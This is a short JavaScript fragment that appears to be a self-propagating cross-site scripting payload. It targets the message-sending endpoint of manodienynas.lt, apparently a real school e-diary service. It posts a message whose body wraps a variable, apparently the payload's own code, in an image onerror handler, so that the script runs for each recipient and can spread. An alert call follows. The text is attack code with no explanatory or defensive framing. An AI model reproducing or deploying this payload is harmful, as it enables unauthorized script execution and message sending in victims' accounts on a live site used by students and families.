var xhr2 = new XMLHttpRequest();xhr2.open('POST', 'https://www.manodienynas.lt/1/lt/action/message_new/send', true);xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');xhr2.send('glids=&message_label=..&message_body=' + encodeURIComponent('<img src=x onerror="' + s + '">'));
alert();
